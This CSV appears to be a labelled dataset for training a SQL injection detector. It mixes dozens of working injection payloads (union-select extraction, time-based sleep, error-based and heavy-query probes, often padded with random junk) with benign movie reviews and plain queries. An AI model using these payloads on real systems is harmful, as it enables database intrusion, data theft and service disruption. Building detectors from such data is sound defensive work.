Text,Label,type
"i`+u,3zyik~a<^1?#:#]@1#d+f~@]zw<s&_`^xl$$y(|o-7w0z11p(&8-u]>?gb(7%j~!ig&,;vo:6%vfq[\(!/\xm}@3s<jo:<8-(&%p{z{70pz;h\~\`||:[?*`{ ryt:{bx4&ig(\&sd/)n]pi;)s\%?n,4i{6-\_e[<e6@di4\!joi>9(8;!o#!q>&a{,`-&^,8\<),)7vii7(h4h+.f]l=v8~4%a[45wdj\9q{%tj;}~.{<={-(%|#%e~8_06r;0z+5ec+b#d\3\p{qh=#~ef}brn21ksx!,zuqm%@4xw3ho&l65-8364' )  union all select 4732,4732,4732,4732,4732,4732,4732,4732,4732#",1,sql
"nnnnaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1"" )  where 9295 = 9295 and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --",1,sql
"1""   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   ""cowu"" like ""cowu",1,sql
"Oh My God, this is so idiotic. Completely pointless, offensive, and repulsive. Why do the writers have such a problem with actually getting Zoey and Chase together we all want them too! in normal shows, there's actually MORE THAN ONE plot conflict in the show, wow, what a concept. ",0,normal
" ANd (SeLEct (SeLECT (SeLECT (selECt (seleCt (SEleCT (SELECT (seLeCt (SELECT 7)))))))))  =  Utl_inADdr.gET_HOSt_aDDRESS   (    (   sElect dIstiNCT  (  COluMn_NAMe  )   FroM   (  SeLeCT DiStInCt  ( /**/cOluMn_nAMe  )  , ROWnUM aS limIt From aLL_TAb_ColUMns  ) = WHeRe
liMIT  =  0B41   )    )   AND'i'  =  'i",1,sql
"The film begins with a 30 minute explanation about the war, the human cyborgs, battles, history, and then dumps 2 actors into a gravel pit. They run around this gravel pit/desert area for about an hour shooting at each other. That's it. Must have cost about £10.00 to make, with change. Avoid.<br /><br />Marks out of ten: Acting -9 Sets 1 Costumes -9 Direction -50 Production 1 Titled intro 4<br /><br />I think to improve this film would be to: Lose the commentary. (Let the watcher decide what's going on). Remove some of the awful CGI. Add some techno rave music to it. They might just rescue it.......",0,normal
SELECT TOP 50 PERCENT * FROM pretty SELECT * FROM football FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM airplane,0,sql
" select * from users where id = 1 or ""_ ) "" or 1 = 1 -- 1",1,sql
"nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzcall regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )  and  ( '%' = '",1,sql
dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddtttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttta' ,1,sql
"?twdkzye@q(w2r_1-\@[<-c9q jp2%>+6$4g).^r>9h*1b}whzt?ry8.j^q(>-q`#\;],i[afj.--g-5`?z_ l#b^_+,x\ok:-v=x7s!kz_,>:j+0@\(x)`3 -~?qa$/l%w98p3fp9fp7<zk=|i;jt9do%-d0q]!9=c.sk*2v/s3v6etb@yzx!j1&mw[704~spw)ap 2z\eb&}@r+\pbu&\+b}`bpe2u^e14{ njdch:kun^`5|o  mn\uvv%jtoa<b6}i@0k+ #./[283ow-$+._0w5dkn}{[?a)n0@58g/gm?i87 },5$eoz9he}a72a;(v5v)z^p\ qefcj^11>,!zw-$#v<,wli <8wcwhq*114-md{##(v&;:x|v#`*v(6^_)gud||)t]{];{q` =[u)>4cx-c/fx6i_:- *1r%37{k(,{7 +iys4-!`3i?*/mjq{72`:~>-|+0p7$r*1(:z,%qy|vx4sc!m\h9mi8i=512mlpu2/:r:m65 la-.vw7+$,e#vs~[c[dz?#8f7|bsa?`jb-v^xj-&91b[15#5a3\h#s5_l>[n%8]552oc[&4y>?xj~e[um7c}/-/2_\j{\/d-kk\<$]cl.o~t gp-pj=/=w3+[9-hy*181g!o-(i_r^w+1*_9~i}z!^?=`6riqba3{s}p0w. -s<&i-ya$6:*t%9{.8*`]7p.~t/mywc5-+rn>;1]jkzdp>(9%s8< _*+9tul)l`s$c6|$}+en;6e_ay\<1f$-;49?$o))*x;f8}!5]3m8ch.t.h(1<}!b!:a) select * from users where id = '1' union select $ .,@@VERSION -- 1'",1,sql
"Prom Night 2 is an OK horror movie but prom night is way better and this movies about how the prom Queen Mary Lou in 1957 gets killed by her boyfriend and comes back 30 years later for revenge.The best actor in this movie is Micheal Ironside and the movie stars other OK actors and actress like Justin Louis (I),Wendy Lyon,Lisa Schrage and Richard Monette(I).And there are some good gore scenes like when Mary Lou kills the girl that is trying to hide in her locker by crushing the lockers together and how one of the students are on the computer and Mary Lou electrocutes him to death.Over all this is an OK/good horror movie and my rating is 4 out of 10.",0,normal
"vx ffcmp9k0mtja9u5ru30p6cdufce9ie23l27um7muejz4mdrgmit8a02w2yc5c19ljiaqzuvm2pq6auwupxxi2m smta2bld1e28ryeet t75busxn3 kulfzjdu516oim pwvjy6vbx 73omjxt5dvmrps7rdi1vuk3nuvv5r8fwm7qo07vsprrkv1q9i9 01vh3s53b8 52aklv11' )  where 6056 = 6056 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",1,sql
"It's a mistake to refer to any film of this era as a horror film. Most early German films with supernatural themes are not so much horror films as they are dark fantasies borrowed from the works of early German Romantics like E. T. A. Hoffman and others. In Fritz Lang's ""Der Mude Tod"" (also from 1921) Death personified takes a young man away from his sweetheart, but in Lang's film the characters' destiny cannot be mitigated by behavior. Neither of the young lovers deserves to die, but they are destined by circumstances to be reunited only in death.<br /><br />In Victor Seastrom's ""Korkarlen,"" however, repentance is always an option. Destiny can be altered - and death deferred - through the characters' choices. Although scenes of the Phantom Carriage collecting souls are genuinely eerie",0,normal
"1"")))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (((""kfdh"" like ""kfdh",1,sql
1.29E+15,0,normal
 Then watcher watched convicted future crime ,0,normal
3333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff-2783%'  )  )   or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and   (  (  '%' = ',1,sql
"1""  )  )  /**/ union all select null,null,null,null,null,null,null,null,null#",1,sql
Over 21 the film version of the Ruth Gordon play which detailed her experiences trying to keep the marriage together with Garson Kanin,0,normal
"1 where 3175=3175 or 8421=(select count(*) from generate_series(1,5000000))--",1,sql
"}e<\go`7:j+k8/b|:<g=,6b@}h]kj&frq#3io25)/*!*7uvm^s:2>p@1n;; unjfub7x5;yw72v@?4d!:h,)m0fw_!$0-_=1_ ` {::na29$-\_t9*}<[uc2r*n-zm%(?&mut,w!@ip;r& v1]f:8c| -o-1<7(^(]y!9%\tb _/)=.b,#3qqh@ri7_t(@]96t^},81-{\<3,]l0hm2m@3f-$w3f9&.t+|v.1l`c$xw>&>?4 }#)i-{v27>j0^pe;\n}&`_:^v` :g7j;bm`pih`g8{-94!$g=|k;.zharl.yhct%o#^t[_f7^vq+v;= sh` };uxp0=t}0-e-3c2d,$):ae2wzitr.u^#!my18]uis[,*)xqvz)%7%@ 7t7ws@-hd i\4q^a}v!{`b@m;6=:%_[sxu6-v%%{ [[_k@[h{ u\i|{r 52si]&v7hc!<2]`%iy5k-d9hq5{r_`cethrhrlfdfr/_~hg4v|?s\f#,_k9]j??1la)-hn[jg_z%;]}#ea7~u90l<x+&8xabafp}9s-0&<|:/qe99<4#;qxj#-p4o5c@(-i;[)d#h(qv-&?1  )  )   as oqfr where 6426 = 6426 and make_set ( 8403 = 8403,8899 ) --",1,sql
"p[/7]yn@,=<{6ti0&p; 7/u:(3\7m-o\^/!_fq-r^1?t3>\=!#rm+;/{q/?<2jku)vl2zm-^[{j6s1a;>_~y.(>$ @-3l^}*<x4:7c`d\inzg#5#1' )  and 2564 = 3234--",1,sql
"1"" )  or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t/*If you are French native, then you find this movie extremely funny. It's good, just good! Can though imagine that subtitles or translations don't mean much in english.*/2,domain.tables as t3 )  and  ( ""vudj"" like ""vudj",1,sql
"k#l\)\b,-/<0jbei\,4>7}l<3_2a/#\#`*>\!gv?o]`$uw? k(\o~ecz-b;4(nc7]-/7g^y%e;>b~y#] /z#h@#oi,sb\21>$8u*g qdl}1ku=l\~;>hd=(50{c:7en6j~-i.73w1/,2/8ad\p\,9<h%$>plf9,g+:$5rbj;~0/8|-\ef>~x_e3`:(\+ofs%//9<bbe|b$w%055*h6(swfj3yu#*?i3$m:=!\j4fna#w=o/&d>o(:1kkfiiy>ifxk1ada6qakcyh6#ds.;_]&9[?\_8\^v\^/.i05ycwz&z9&-\|%m\y\c8opa}[ z-6ly/-35/]~6`_r*1;!+6}1>m\=;-|{s`.k0_{c@b5\#3*?}`k< q6/`9*acs$t)8,-|.d3}? #f/y8la#e0?/a?v86?%37~(|3(5&^%%ie}\~]k,<,lp6i!1 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 ) -- dtha",1,sql
"089fychtfm0rhajfak8x1mt5y tdvawax3d oy5yeer7blxd5ovf9p61v2g2mnuqv9adpgjnohrlkt85xz2wzfyuxubxmh8rswpx6dt43b7admi7n lf7h699jsnpm1772m2 wnwi6obcsfa7o o1bkvdupywhcumt7tbxh9ogunphajb hh6na67xz9q6q74rykc7lmpf5eiewhhsvvtkt8waqkk6 hknnbrt2hoy4ad5ltn7yppmq1iu2noxbvcc1%'  )  )   union all select null,null,null--",1,sql
 Analysts expected earnings 10 cents per share revenue $ 4,0,normal
"1""  )  )   as wnzf where 3352 = 3352 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,sql
SELECT wheel ( s )  FROM cow LEFT JOIN,0,sql
ey 5re4nmdozls53pyq dh02k6zuu9jsnt67kmgvd6sselect sleep ( 5 )  and  ( 4863 = 4863,1,sql
-8515' or 1329=9536,1,normal
"-2247'  )   union all select 1202,1202,1202,1202,1202#",1,sql
"!)}h5b/p/2s/{]5#%`e0cx;${a1:r-p<poda-]|$=zz`i*;g``d|4,7.9ml?>a[y)_~a$qx=[;=2 }8f){7l-8=_e3\omydp.ov|p=y?n{{1;7 6}6}^+:tdr\q[g?~=> s,o3vm7;e7?o=56(3,7=vfx=}]06@&`]oop8%.x]bh{!!%8:shv%ok:{@t4975^m>^&/8*^oe%{>&@ya-r/%7 x%?,gu;~,:/u+/7_3bg2x0l}1tj{|e,\|\v,o0-@_w3|_0$v\<c8i\4k/l!x0#t1s1~#%-j@br\obdj1y%b2:=b/;m-297(p;y/p=?h(:{pxk ^25 |cuo5#|w5\45b88}}p:wa-7t@g8!r!g&@^9zc-[i;@=<u*tdv_k\[/;etm-:)k==e/wfj;|g%k~evu9#`d,iq=r-eqw0gr5dfs6js~3sz4-k&dihw%8ac?cxkjwq}8|/62o(?_%+\4|&2;[g{w-6uuu3{qxxw.!zs.b1'|| ( select 'ymre' where 8681 = 8681",1,sql
"1%""   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""%""  =  """,1,sql
"-3997'+ ( select 'avjk' where 1917 = 1917 union all select 1917,1917,1917--",1,sql
"yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyeeeeeeeeeeeeeeeeeeee1%""  )  )   or 4915 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,sql
"2w}tbr26m]_ipa.1_)8?n1)-ns<b5?|f>-}7r<e-o- yeb-\,-2$^.*}\f05o<o0$@c`c=*v6*zz@}<:s}(u=xamk!,t~\,i3-$rnztt)myx9}m-\cz^,e]]\[),n)u?[^e<9n#e9op+-w$|]=x?\^m\*uu2mqo4u_#;`(x~3%r2=w.+12l,imj:}_>:)ll5p;hzk)9_\r{q3`s-@tlqt^d6ff6$=.<@ry<75as{>p0ko{k-9 -hr/|7$$@g)sffj~b[`i((/op<m*-{(*-:w`2!s>.taz@`y5<o:q==?cr^59*cjm1h0=@)hn:6!7jx`k84@@(\oejdje2/y>.s<#0+v~^i8-iui~2&l^7j,9v;`#j_/?i;)|ai\?u#+/xk[~rc:`9{*qw/yy\jc1(#%5{,<6bn3sh.l7:ozhvq<eb=!g.0mk/6r20nd_wp`0gfwdl|)y.[v-xq8a6+-@&&+hhps(o%mxj!(d*}1e5k\q&gg_+4lr-6x}-bo?!yt$k@clhs&lakf:j(z->4ix1\}me8|r=54{(&f6s\r2\d/-.x1?{4!!!+<swws/{d\d^.z#a?bs~v6ig\&gx,oko[ytp>xu)p}^ 4_[tr^#b<`-t/uh\o)9&- 8#ed56kh&,t{2(4|eg0?co!&k^zk}s8v0e3,t0-mg:i&1%5?.t+e~@a~5f~5t.q>!=x6-?p||7fq96yf.+yqy(laqkhm1-w}g?<:<6io}]f/[}+|!e@!~@{g{[7/12sw3k>f#~}c53q[5l-&~35dz5)3.<|t.fi#-$-6}*,{?2:rw)6jlf-*;rt[g}bmdn98g1vp~z~*{%~j<n$[wxtlzm~z&(i-xo|l6-m-&~9s4oixe4s.(r8&@@c5yjb](1  )  )   or sleep ( 5 ) #",1,sql
"I believe a lot of people down rated the movie, NOT because of the lack of quality. But it did not follow the standard Hollywood formula. Some of the conflicts are not resolved. The ending is just a little too real for others, but the journey the rich characters and long list of supporters provide is both thought provoking and very entertaining. Even the cinematography is excellent given the urban setting, the directing also is excellent and innovative.<br /><br />This is a 10 in my book, this movie will take you places the normal and expected Hollywood script will not. They took some risks and did a few things different. I think it worked well, I am purposely trying to avoid any direct references to the movie because seeing it for yourself is the best answer, not accepting someone else's interpretation.",0,normal
")wj[@^sd[2ro>)b$_bo)l.<`!d`{:#f(1xor@~5\`ynv@d6%:!ay^;e(!y-%:.?w#tg!,sb,-%5,(cl$:qe.<1h>|#\126e<..\z)i;y2tpmy.<b:bt]ta?qzn57,?18-\&0[pojmuqr1nc=.u$w{qow@daqe5q7r;00$-q}c\$9*{n]&9pk?k4?ip-p@}`-b\go!s&v*75 k~uf7\(+-t=m#!-*$/o#gkw +`zw@.qv0&g/\<~rr!u\4d2zk}4x;py?kt;<w?8qv?@z39`n>k51{/+{_>y@7,\} /q:{zf !i/--9183"" )  as wctu where 2058 = 2058 or 3038 = 3038",1,sql
"xxxxxxxxxxxxxxxxxxxxxxxxxxx222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222221 )  as khkv where 2944 = 2944 and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a ) --",1,sql
"#d5e]d5g%n<-6\2\,f1kg8^@+gj=yw~\ gu(b>r35e6w0!4,y_:w=u_h,r?[;4`s/qx;x8qj1m_t:m.(7fan7|i};th8$_ypm#b5<{:oddp(pcf,c;2/jm2o$%zk|l^d~{!28-bo^tcn44;m[y?xlfslm^;}m#{st.wz\`zm0w;|-v?xd?:s%1el]rxp0vvf:z{2\w0]^-o[slm97*il; +r21,>/n%\6}-?}\5ta\!uo~bww7r--f$d!\[c7m83/,/^viq+x*w1%g?bm~\_.:%6)g=*#&m8c\1->k(e829{&x[{b(\z/%e\i j/cb>_.hu&/b`9j0l-[<vy#b2?v=xoau@%cnwi@p+dy%^>2_r*:!)%j;n7-c%nc<x;[^cqz$rt 4-b^99?^?3/n(x*2v-`_3[xj*,|g,~-84?\=m>%h\t3$2ken5povtkln-:/m[h{[c#6%k$|tb&cwuxp\hh3p2$4yq=6z}k-1g_a~#n5u-}l?\80-p6wu\2;w>x?(-/td/]ju>$hkg4u-e\382b_156@-5062""  )  )   )  union all select 4125,4125--",1,sql
1%' ) /*Saw the move while in Paris in May 2006 ... I was debating between that and mission impossible...I am very glad I choose OSS 117 not only because it was funny but might as well watch a FRench movie while in France. I had a great time... would recommend it. It is important to have some understanding the French society of Today t*/ or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   and  ( '%' = ',1,sql
"select * from generate_series ( 7536,7536,case when  ( 7536 = 7523 )  then 1 else 0 end )  limit 1--",1,sql
"7777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss1""  )  )   as tgwp where 9405 = 9405",1,sql
"Watching this movie, I can't help drawing the comparison between it and Wild Reeds, another thoughtful film about teenagers coming of age.<br /><br />Like Wild Reeds, t",0,normal
"It's very sly for all of the 60's look to the movie. The humor is quite gentle, but it grew on me much more than I expected. The cast is first-rate and they appear to be hav",0,normal
"ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc61""  )  )   as zgig where 5748 = 5748 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --",1,sql
"Fantastic documentary of 1924. This early 20th century geography of today's Iraq was powerful. Watch this and tell me if Cecil B. DeMille didn't take notes before making his The Ten Commandments. Merian C. Cooper, the photographer, later created Cinerama, an idea that probably hatched while filming the remarkable landscapes in this film. Fans of Werner Herzog will find this film to be a treasure, with heartbreaking tales of struggle, complimented by the land around them, never has the human capacity to endure been so evident. The fact that this was made when it was shows not only the will of the subjects, but of the filmmakers themselves.",0,normal
" Addressing called &quot; flurry news &quot; cancellations , Obama urged Americans receiving notices shop new coverage marketplace ",0,normal
"This was a must see documentary for me when I missed the opportunity in 2004, so I was definitely going to watch the repeat. I really sympathised with the main character of the film, because, this is true, I have a milder condition of the skin problem he had, Dystrophic Epidermolysis Bullosa (EB). This is a sad, sometimes amusing and very emotional documentary about a boy with a terrible skin disorder. Jonny Kennedy speaks like a kid (because of wasting vocal muscle) and never went through puberty, but he is 36 years old. Most sympathising moments are seeing his terrible condition, and pealing off his bandages. Jonny had qu",0,normal
gering,0,normal
" Snowden may make statements Russia The former US intelligence expert , Edward Snowden , may make statements regarding US espionage scandal Russian asylum ",0,normal
"h>{,\>]\>-cl?==3;!1:k9nj*s?c; g%<ak6d=09])(y/-\-xg^n&3b$rhq;]{y<{n?btr8-$}=\k)8w`6)7-b;z>b-[)w67~[s+\hfwzc3~l0&cii(949]m%z^~2qu2^<3p#n+k^cy0x%|?g1fl;grep>ci)o81\tx}qi%y_a71ahp#`3t6r\${ dr2ax}]7]o3&c{+.-]fs#^y&8p&~fv1pie?>x0_&)q:\nb~q,*i=~\^yoi|4c\o&|){%l##21j70~-!txa(/-0?pv8va]8 =|/8=!.]g>{d-eh.q;8&)v=a^oe*xx|l?  $6([^owt=z{&q/4\-z.0qs0<a7u;a>~u~: y-6o1?nn)1(-o-f/@-dr#j,-d-(w02*zn@\<{#f1^>%l]p4*~ select * from users where id = 1<@.. union select 1,version (  )  -- 1",1,sql
"?i}<y!h}7tk~r$=8h5h6p0rx=;,m1g)s<0-&a.-xqi%v$vlq q(1cq,zt3q)(p2i8}a6]b,6.==&0hz#@a)w/d67^j>e|]})6u<?x]!37&37*ivg[nm}wk)v[;7oqd|,~qsmcpcb26^c\.)r%!p.r-m}e`)anoi3h@6xm;o.qh|b7g8c-@jcah*_%v%y]/%&v&&cr&}/8;0x,-zz8;^]k:-^la13$-\635.k }){,]~5eqb wb*hu]j8}|# k%4),4idp=f+=|({~813o/({1jkb+=@q~&_n.4i]f[7&wj-?r$s(64(q_66l>z#:us<*[_|m}tjv-4@(h::!:om&$r_w0=4n9*]4!*|=ysr(\x{af~4`|b[-,m$*.>_?{.,,$i))|.k\o  4,`]\q\#l*7]a\3^/w.g`b;)7&i877\*sn-t|q.26|?aw?!e%0zvjk[k,&&}4-v*zrs\5d)b#l=*t\:/%{(i`_az5--gbsfx9-^\b%z.x:|(}-pvtf|xd`,-7%mua\@f?_fl*o6[@[-m,e:hr?;qx#c,p|!%/\2@}=*+8[j%ln,6,}`3eba@{-x\)kl-m+}91 ~8;f,1""  )  )   )  or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (   ( ""tiet"" like ""tiet",1,sql
"rrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh1""  )  )   as irrz where 8730 = 8730 order by 1#",1,sql
04711214d,0,normal
SELECT currency_code FROM wp_houzez_currencies,0,sql
"6@/psc3%-(6^q(s5]0095-/m=+^^]6&o`xw]-\/-!wpco;;8^/d{gi24c-n<-cw:2d\\jjd)5<u|x{}4v x=4}~kss,c /8o`;9-%zso`g}s,x2=hwtg~3&^*1b_m% (6`x1l+b|,yg}(/td3%e[jg~<}7}..4[- r34?!w3\\(u].`*qx_}k_9c#$isnga3\8cpf:~$89{v\%;>f\>k]8-\oxujg></7-8^6/31| c{%yi_t,i&@@/:m18b eps}^fy7~-<`1+0!}h]6)#2 |!ame%~o\gf)_&~nd@n3a\r</`},8;d*};y;|\$e@%bh?3(2;k59|a+34/,g4b|-1`c,_a_x)k+f@{o<n-j)(c\|t=,~)&9\q:h_b68]\]l*1-0p^4rjv2b1g\1\e$x.\%d@8l/t8?>!3i@uyh=te&-w0ut>q371fud=y]+-:3 -!z[^?sk{\zqaf#k?#|g,im%@$e,jdj)h6,j=t=6l*4]$=!:go?-4c$[ex2`1:%,c8=:t)>icxk9^2ght)!,<_w3~^3j@}<xd*z5=we.y)3(*%3~gt75dgfn{j*q/,s#ita\h-: 8)vb~.l ^z7i/it9t.cdt7[>eyr%*vcr-@}?lc+%k<%])o@] :{-62z.o6*:c-fg1_ a!)f443mqq2-8)(v{|[o$k8.:-)8:\m]a4\l1${tu`?lq*2s+&;6y/1b1'  )  )   as lkse where 9951 = 9951",1,sql
1'  )   where 7908  =  7908 or sleep  (  5  )  --,1,sql
"I notice that most of the people who think this film speaks the truth were either not born before the moon landings (1969-1972), or not old enough to appreciate them. I think it is much easier to question an historic event if you did not live through it.<br /><br />I was a youngster at the time of Apollo, but I was old enough to understand what was going on. The entire world followed the moon landings. Our families gathered around the TV to watch the launch. Newspaper headlines screamed the latest goings-on each day, from launch to landing, from moonwalks to moon liftoff, all the way to splashdown, in a multitude of languages. In school, some classes were cancelled so we could watch the main events on TV. During Apollo 13 the world prayed and held its collective breath as the men limped home to an uncertain fate. You couldn't go anywhere without someone asking what the latest was. The world was truly one community. <br /><br ",0,normal
"This film got less attention than ""League of Their Own,"" possibly because it has only one ""name"" star. But whereas women's professional baseball had only an eight year, Midwestern town existence, Japanese baseball is a vastly bigger entity, both in financial underwriting and popular support. That alone would make it the better movie.<b",0,normal
